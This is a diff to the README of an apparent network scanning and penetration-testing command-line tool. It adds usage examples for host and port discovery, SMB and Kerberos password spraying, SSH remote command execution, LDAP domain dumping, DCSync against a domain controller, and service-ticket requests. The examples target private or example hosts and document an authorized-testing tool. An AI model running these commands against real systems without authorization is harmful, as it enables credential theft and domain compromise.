@@ -31,13 +31,32 @@ For the full list of available installation options, please see the [Installatio
 ### General Usage
 
 ```bash
-networkscan discover port <flags>
+networkscan [command] [subcommand] <flags>
 ```
 
 #### Examples
 
 ```bash
-networkscan discover port --top-ports 100 --targets scanme.sh
+# Network Discovery
+networkscan discover host --target 192.168.1.0/24 --scan-type ICMP_ECHO
+networkscan discover port --target scanme.sh --top-ports 100
+networkscan discover service --target scanme.sh:22
+networkscan discover tls --targets scanme.sh:443
+networkscan discover domain --target 192.168.1.1
+
+# Service Enumeration
+networkscan enumerate service --targets 192.168.1.10:22,192.168.1.11:21 --service ssh
+
+# Penetration Testing - Credential Spraying
+networkscan pentest spray password --targets 192.168.1.0/24 --service SMB --usernames admin,guest --passwords Password123,123456
+networkscan pentest spray username --targets dc.example.com:88 --service KERBEROS --domain EXAMPLE.COM --usernames admin,guest
+
+# Penetration Testing - Service Specific
+networkscan pentest service smb --targets 192.168.1.100:445 --usernames admin --passwords password --actions AUTHENTICATE,SHARE_ENUM
+networkscan pentest service ssh --targets 192.168.1.100:22 --usernames root --passwords password --actions AUTHENTICATE,EXECUTE --execute "whoami"
+networkscan pentest service ldap --targets dc.example.com:389 --usernames user --passwords pass --domain EXAMPLE.COM --actions DOMAINDUMP
+networkscan pentest service msrpc --targets dc.example.com:445 --usernames admin --passwords Password123 --domain EXAMPLE.COM --actions DCSYNC
+networkscan pentest service kerberos --targets dc.example.com:88 --usernames user --passwords pass --domain EXAMPLE.COM --actions SERVICE_TICKET --spn HTTP/server.example.com
 ```
 
 ## Contributing
